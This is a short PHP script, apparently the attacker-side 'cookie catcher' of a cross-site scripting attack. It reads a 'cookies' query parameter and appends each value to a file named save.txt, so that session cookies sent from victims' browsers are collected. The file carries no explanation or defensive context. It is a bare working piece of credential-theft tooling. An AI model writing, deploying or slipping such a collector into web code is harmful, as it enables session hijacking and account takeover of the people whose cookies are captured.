<?php
/**
 * Created by PhpStorm.
 * User: Simon
 * Date: 6/6/2018
 * Time: 下午 5:41
 */

$fp = fopen("save.txt","a");
fwrite($fp,$_GET['cookies'].'\n');
fclose($fp);